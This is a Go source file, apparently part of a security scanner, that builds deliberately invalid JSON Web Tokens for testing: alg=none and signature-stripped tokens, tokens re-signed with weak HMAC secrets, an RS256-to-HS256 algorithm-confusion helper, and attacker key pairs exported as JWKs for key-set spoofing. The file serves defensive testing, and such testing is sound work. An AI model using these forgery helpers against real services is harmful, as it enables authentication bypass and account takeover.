// This file deliberately constructs malformed JWTs for security testing.
// It bypasses the protections golang-jwt/jwt provides (alg validation,
// signature verification, header consistency). Do not use these helpers
// outside this package or outside JWT-mutator code paths.
//
// The intent is to produce the exact byte sequences a real attacker
// would send — including alg=none tokens, stripped signatures, claim-
// tampered bodies, and tokens re-signed with weak HMAC secrets — so the
// scanner can probe whether the target's verifier rejects them.

package jwt

import (
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/hmac"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/base64"
	"encoding/json"
	"encoding/pem"
	"errors"
	"fmt"
	"math/big"
	"sort"
	"strings"
)

// b64url encodes per RFC 7515: base64 URL without padding.
func b64url(b []byte) string {
	return base64.RawURLEncoding.EncodeToString(b)
}

// B64URL is the exported form for use by mutators that need to compute
// signatures to compare against captured token signatures.
func B64URL(b []byte) string { return b64url(b) }

// b64urlDecode is the inverse, lenient about padding presence.
func b64urlDecode(s string) ([]byte, error) {
	// Accept both padded and unpadded; some captured tokens have padding.
	s = strings.TrimRight(s, "=")
	return base64.RawURLEncoding.DecodeString(s)
}

// marshalSorted JSON-encodes m with sorted top-level keys. Determinism
// matters because the variant ID is hashed off this output — same claims
// must produce the same bytes across runs.
func marshalSorted(m map[string]any) ([]byte, error) {
	if m == nil {
		return []byte("{}"), nil
	}
	keys := make([]string, 0, len(m))
	for k := range m {
		keys = append(keys, k)
	}
	sort.Strings(keys)
	var b strings.Builder
	b.WriteByte('{')
	for i, k := range keys {
		if i > 0 {
			b.WriteByte(',')
		}
		// Use json.Marshal for the key+value so escaping matches the std
		// library exactly.
		kb, err := json.Marshal(k)
		if err != nil {
			return nil, err
		}
		vb, err := json.Marshal(m[k])
		if err != nil {
			return nil, err
		}
		b.Write(kb)
		b.WriteByte(':')
		b.Write(vb)
	}
	b.WriteByte('}')
	return []byte(b.String()), nil
}

// Encode assembles a JWT from the given header/claims/signature, base64-
// url-encoding each segment per RFC 7515 and joining with dots. sig is
// the raw signature bytes (may be empty for alg=none / sig-strip).
//
// The header is NOT cross-checked against the signature — that is the
// whole point of this constructor: the mutator wants to emit invalid
// combinations on purpose.
func Encode(header, claims map[string]any, sig string) (string, error) {
	hb, err := marshalSorted(header)
	if err != nil {
		return "", err
	}
	cb, err := marshalSorted(claims)
	if err != nil {
		return "", err
	}
	out := b64url(hb) + "." + b64url(cb) + "."
	if sig != "" {
		out += sig
	}
	return out, nil
}

// SignHS256 produces the base64url-encoded HMAC-SHA256 signature over
// the encoded header+claims using the provided secret. Used by
// jwt-resign-weak-key.
func SignHS256(encodedHeader, encodedClaims, secret string) string {
	h := hmac.New(sha256.New, []byte(secret))
	h.Write([]byte(encodedHeader + "." + encodedClaims))
	return b64url(h.Sum(nil))
}

// AlgConfusionFromPEM implements the RS256/ES256→HS256 algorithm confusion
// attack: parse the PEM-encoded public key and use its raw DER bytes as the
// HMAC-SHA256 secret to re-sign the header+claims. The header alg is set to
// HS256. Returns an error when the PEM does not contain a recognised public key.
func AlgConfusionFromPEM(header, claims map[string]any, pemBytes string) (string, error) {
	secret, err := pemToRawBytes(pemBytes)
	if err != nil {
		return "", fmt.Errorf("alg-confusion: %w", err)
	}
	h := copyMapAny(header)
	h["alg"] = "HS256"
	return EncodeWithHS256(h, claims, string(secret))
}

// pemToRawBytes extracts the raw DER bytes from a PEM block. Supports
// RSA and EC public keys (PKIX and traditional PKCS1/SEC1 forms).
func pemToRawBytes(pemStr string) ([]byte, error) {
	block, _ := pem.Decode([]byte(pemStr))
	if block == nil {
		return nil, errors.New("no PEM block found")
	}
	return block.Bytes, nil
}

// GenerateAttackerKeyPair generates an ephemeral RSA-2048 key pair for the
// JWKS-spoof attack. Returns (privateKey, publicKey, error).
func GenerateAttackerKeyPair() (*rsa.PrivateKey, *rsa.PublicKey, error) {
	priv, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return nil, nil, err
	}
	return priv, &priv.PublicKey, nil
}

// SignRS256 produces the base64url-encoded RS256 (RSASSA-PKCS1-v1_5 SHA-256)
// signature over encodedHeader+"."+encodedClaims.
func SignRS256(encodedHeader, encodedClaims string, priv *rsa.PrivateKey) (string, error) {
	h := sha256.New()
	h.Write([]byte(encodedHeader + "." + encodedClaims))
	digest := h.Sum(nil)
	sig, err := rsa.SignPKCS1v15(rand.Reader, priv, 5, digest) // 5 = crypto.SHA256
	if err != nil {
		return "", err
	}
	return b64url(sig), nil
}

// EncodeWithRS256 assembles a JWT signed with RS256 using priv.
func EncodeWithRS256(header, claims map[string]any, priv *rsa.PrivateKey) (string, error) {
	h := copyMapAny(header)
	h["alg"] = "RS256"
	if _, ok := h["typ"]; !ok {
		h["typ"] = "JWT"
	}
	hb, err := marshalSorted(h)
	if err != nil {
		return "", err
	}
	cb, err := marshalSorted(claims)
	if err != nil {
		return "", err
	}
	eh := b64url(hb)
	ec := b64url(cb)
	sig, err := SignRS256(eh, ec, priv)
	if err != nil {
		return "", err
	}
	return eh + "." + ec + "." + sig, nil
}

// PublicKeyToJWK converts an RSA public key to a minimal JWK map.
func PublicKeyToJWK(pub *rsa.PublicKey, kid string) map[string]any {
	return map[string]any{
		"kty": "RSA",
		"alg": "RS256",
		"use": "sig",
		"kid": kid,
		"n":   b64url(pub.N.Bytes()),
		"e":   b64url(big.NewInt(int64(pub.E)).Bytes()),
	}
}

// GenerateAttackerECKeyPair generates an ephemeral EC P-256 key pair.
func GenerateAttackerECKeyPair() (*ecdsa.PrivateKey, *ecdsa.PublicKey, error) {
	priv, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		return nil, nil, err
	}
	return priv, &priv.PublicKey, nil
}

// PublicKeyToJWKEC converts an EC public key to a minimal JWK map.
func PublicKeyToJWKEC(pub *ecdsa.PublicKey, kid string) map[string]any {
	return map[string]any{
		"kty": "EC",
		"alg": "ES256",
		"use": "sig",
		"crv": "P-256",
		"kid": kid,
		"x":   b64url(pub.X.Bytes()),
		"y":   b64url(pub.Y.Bytes()),
	}
}

// EncodePKIX encodes a public key to PKIX PEM form.
func EncodePKIX(pub any) (string, error) {
	der, err := x509.MarshalPKIXPublicKey(pub)
	if err != nil {
		return "", err
	}
	block := &pem.Block{Type: "PUBLIC KEY", Bytes: der}
	return string(pem.EncodeToMemory(block)), nil
}

func copyMapAny(m map[string]any) map[string]any {
	out := make(map[string]any, len(m))
	for k, v := range m {
		out[k] = v
	}
	return out
}

// EncodeWithHS256 is the convenience path: build header+claims, sign
// with HS256 + secret, return the assembled token.
func EncodeWithHS256(header, claims map[string]any, secret string) (string, error) {
	// Ensure header alg matches the signing path so the resulting token
	// is well-formed (alg=HS256). Mutator may override alg via the map
	// before calling this — in which case the signature still uses HMAC
	// but the declared alg may differ. That's intentional.
	if header == nil {
		header = map[string]any{}
	}
	if _, ok := header["alg"]; !ok {
		header["alg"] = "HS256"
	}
	if _, ok := header["typ"]; !ok {
		header["typ"] = "JWT"
	}
	hb, err := marshalSorted(header)
	if err != nil {
		return "", err
	}
	cb, err := marshalSorted(claims)
	if err != nil {
		return "", err
	}
	eh := b64url(hb)
	ec := b64url(cb)
	sig := SignHS256(eh, ec, secret)
	return eh + "." + ec + "." + sig, nil
}
